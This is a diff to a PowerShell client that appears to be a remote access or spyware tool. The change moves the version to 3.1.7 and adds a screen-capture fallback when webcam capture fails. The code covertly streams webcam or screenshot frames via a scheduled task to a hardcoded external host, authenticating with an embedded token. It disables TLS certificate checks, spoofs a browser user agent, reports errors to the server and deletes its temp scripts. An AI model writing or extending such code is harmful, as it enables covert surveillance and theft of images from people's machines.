@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.1.6"
+$Version = "3.1.7"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -374,21 +374,20 @@ function Start-CameraStream {
         # SYSTEM PATH: scheduled task runs as logged-on user, polls /signal to stop
         $taskId = "CameraCapture_$(Get-Random)"
         $scriptPath = Join-Path $env:TEMP "cam_$taskId.ps1"
+        $errLog = Join-Path $env:TEMP "cam_err_$taskId.txt"
         $captureScript = @"
 param()
-`$ErrorActionPreference = 'SilentlyContinue'
+`$ErrorActionPreference = 'Stop'
 [System.Net.ServicePointManager]::DefaultConnectionLimit = 4
 try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 } catch { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 }
 try { if (-not ([System.Management.Automation.PSTypeName]'TrustAllCertsPolicy').Type) { Add-Type @'
 using System.Net; using System.Security.Cryptography.X509Certificates;
 public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; } }
 '@ }; [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new() } catch {}
-Add-Type -AssemblyName System.Runtime.WindowsRuntime
-[void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
-[void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
-[void][Windows.Storage.Streams.DataReader, Windows.Storage.Streams, ContentType=WindowsRuntime]
-[void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
-function Await { param(`$op); `$t=[System.WindowsRuntimeSystemExtensions]::AsTask(`$op); `$t.Wait(); if(`$t.IsFaulted){throw `$t.Exception.InnerException}; return `$t.Result }
+function Report([string]`$msg) {
+    try { [System.IO.File]::WriteAllText('$errLog', `$msg) } catch {}
+    try { `$wc=New-Object System.Net.WebClient;`$wc.Headers.Add('User-Agent','Mozilla/5.0');`$wc.Headers.Add('X-Token','81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782');`$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes(`$msg)) | Out-Null;`$wc.Dispose() } catch {}
+}
 function UploadFrame([byte[]]`$data) {
     try {
         `$r=[System.Net.HttpWebRequest]::Create('$cfHost/camera_frame?id=$clientId')
@@ -404,7 +403,27 @@ function ShouldStop {
         return (`$val -eq 'stopstream' -or `$val -eq 'cancel')
     } catch { return `$false }
 }
+function ScreenshotJpeg {
+    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    `$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    `$bmp=New-Object System.Drawing.Bitmap(`$s.Width,`$s.Height)
+    `$g=[System.Drawing.Graphics]::FromImage(`$bmp)
+    `$g.CopyFromScreen(`$s.Location,[System.Drawing.Point]::Empty,`$s.Size)
+    `$g.Dispose()
+    `$ms=New-Object System.IO.MemoryStream
+    `$bmp.Save(`$ms,[System.Drawing.Imaging.ImageFormat]::Jpeg)
+    `$bmp.Dispose()
+    return `$ms.ToArray()
+}
+# --- Try WinRT camera first, fall back to screenshot ---
+`$usedScreen=`$false
 try {
+    Add-Type -AssemblyName System.Runtime.WindowsRuntime -ErrorAction Stop
+    [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
+    [void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
+    [void][Windows.Storage.Streams.DataReader, Windows.Storage.Streams, ContentType=WindowsRuntime]
+    [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
+    function Await { param(`$op); `$t=[System.WindowsRuntimeSystemExtensions]::AsTask(`$op); `$t.Wait(); if(`$t.IsFaulted){throw `$t.Exception.InnerException}; return `$t.Result }
     `$device=[Windows.Media.Capture.MediaCapture]::new()
     Await(`$device.InitializeAsync()) | Out-Null
     `$enc=[Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
@@ -423,7 +442,24 @@ try {
     }
     try { `$device.Dispose() } catch {}
 } catch {
-    try { `$wc=New-Object System.Net.WebClient;`$wc.Headers.Add('User-Agent','Mozilla/5.0');`$wc.Headers.Add('X-Token','81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782');`$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes("[!] Camera failed: `$(`$_.Exception.Message)`n")) | Out-Null;`$wc.Dispose() } catch {}
+    `$camErr = `$_.Exception.Message
+    Report "[!] Camera (WinRT) failed: `$camErr -- falling back to screen capture`n"
+    `$usedScreen=`$true
+    # --- Screenshot fallback ---
+    try {
+        `$i=0
+        while (`$true) {
+            try {
+                `$bytes = ScreenshotJpeg
+                UploadFrame `$bytes
+                `$i++
+            } catch { break }
+            if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
+            Start-Sleep -Milliseconds 500
+        }
+    } catch {
+        Report "[!] Screenshot fallback also failed: `$(`$_.Exception.Message)`n"
+    }
 }
 "@
         try {
@@ -436,7 +472,14 @@ try {
             Start-ScheduledTask -TaskName $taskId
             $script:cameraTaskId = $taskId
             $script:cameraScriptPath = $scriptPath
+            $script:cameraErrLog = $errLog
             Write-Log "Camera task started: $taskId" "INFO"
+            # Give the task 4s to fail fast, then report any error it wrote
+            Start-Sleep -Seconds 4
+            if (Test-Path $errLog) {
+                $errMsg = [System.IO.File]::ReadAllText($errLog).Trim()
+                if ($errMsg) { Send-Stream-To-Server -Body "$errMsg`n" }
+            }
         } catch {
             Write-Log "Camera task failed: $($_.Exception.Message)" "WARN"
             try {
@@ -464,8 +507,42 @@ try {
     $ps.Runspace = $rs
     $ps.AddScript({
         $ErrorActionPreference = 'SilentlyContinue'
+        function UploadFrame([byte[]]$data) {
+            try {
+                $req = [System.Net.HttpWebRequest]::Create("$cfHost/camera_frame?id=$clientId")
+                $req.Method='POST'; $req.ContentType='image/jpeg'; $req.ContentLength=$data.Length
+                $req.Headers.Add('X-Token', $cfToken)
+                $req.Timeout=5000; $req.ReadWriteTimeout=5000; $req.UserAgent='Mozilla/5.0'
+                $s = $req.GetRequestStream(); $s.Write($data, 0, $data.Length); $s.Close()
+                $req.GetResponse().Close()
+            } catch {}
+        }
+        function Report([string]$msg) {
+            try {
+                $wc = New-Object System.Net.WebClient
+                $wc.Headers.Add('User-Agent','Mozilla/5.0')
+                $wc.Headers.Add('X-Token', $cfToken)
+                $wc.UploadData("$cfHost/result?id=$clientId", 'POST',
+                    [System.Text.Encoding]::UTF8.GetBytes($msg)) | Out-Null
+                $wc.Dispose()
+            } catch {}
+        }
+        function ScreenshotJpeg {
+            Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+            $scr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+            $bmp = New-Object System.Drawing.Bitmap($scr.Width, $scr.Height)
+            $g   = [System.Drawing.Graphics]::FromImage($bmp)
+            $g.CopyFromScreen($scr.Location, [System.Drawing.Point]::Empty, $scr.Size)
+            $g.Dispose()
+            $ms  = New-Object System.IO.MemoryStream
+            $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+            $bmp.Dispose()
+            return $ms.ToArray()
+        }
+        # Try WinRT camera, fall back to screenshot
+        $cameraOk = $false
         try {
-            Add-Type -AssemblyName System.Runtime.WindowsRuntime
+            Add-Type -AssemblyName System.Runtime.WindowsRuntime -ErrorAction Stop
             [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
             [void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
             [void][Windows.Storage.Streams.DataReader, Windows.Storage.Streams, ContentType=WindowsRuntime]
@@ -474,6 +551,7 @@ try {
             $initTask = [System.WindowsRuntimeSystemExtensions]::AsTask($device.InitializeAsync())
             $initTask.Wait()
             if ($initTask.IsFaulted) { throw $initTask.Exception.InnerException }
+            $cameraOk = $true
             $enc = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
             while ($sharedState.CameraRunning) {
                 try {
@@ -488,26 +566,28 @@ try {
                     $bytes = [byte[]]::new($ras.Size)
                     $dr.ReadBytes($bytes)
                     $dr.Dispose(); $ras.Dispose()
-                    # Upload frame directly
-                    $req = [System.Net.HttpWebRequest]::Create("$cfHost/camera_frame?id=$clientId")
-                    $req.Method='POST'; $req.ContentType='image/jpeg'; $req.ContentLength=$bytes.Length
-                    $req.Headers.Add('X-Token', $cfToken)
-                    $req.Timeout=5000; $req.ReadWriteTimeout=5000; $req.UserAgent='Mozilla/5.0'
-                    $s = $req.GetRequestStream(); $s.Write($bytes, 0, $bytes.Length); $s.Close()
-                    $req.GetResponse().Close()
+                    UploadFrame $bytes
                 } catch { break }
                 Start-Sleep -Milliseconds 200
             }
             try { $device.Dispose() } catch {}
         } catch {
-            try {
-                $wc = New-Object System.Net.WebClient
-                $wc.Headers.Add('User-Agent','Mozilla/5.0')
-                $wc.Headers.Add('X-Token', $cfToken)
-                $wc.UploadData("$cfHost/result?id=$clientId", 'POST',
-                    [System.Text.Encoding]::UTF8.GetBytes("[!] Camera failed: $($_.Exception.Message)`n")) | Out-Null
-                $wc.Dispose()
-            } catch {}
+            $camErr = $_.Exception.Message
+            if (-not $cameraOk) {
+                Report "[!] Camera (WinRT) failed: $camErr -- falling back to screen capture`n"
+                # Screenshot fallback
+                try {
+                    while ($sharedState.CameraRunning) {
+                        try {
+                            $bytes = ScreenshotJpeg
+                            UploadFrame $bytes
+                        } catch { break }
+                        Start-Sleep -Milliseconds 500
+                    }
+                } catch {
+                    Report "[!] Screenshot fallback also failed: $($_.Exception.Message)`n"
+                }
+            }
         } finally {
             $sharedState.CameraRunning = $false
         }
@@ -540,6 +620,10 @@ function Stop-CameraStream {
     if ($script:cameraScriptPath) {
         try { Remove-Item $script:cameraScriptPath -Force -ErrorAction SilentlyContinue } catch {}
         $script:cameraScriptPath = $null
+    }
+    if ($script:cameraErrLog) {
+        try { Remove-Item $script:cameraErrLog -Force -ErrorAction SilentlyContinue } catch {}
+        $script:cameraErrLog = $null
     }
     Write-Log 'Camera stopped' 'INFO'
 }
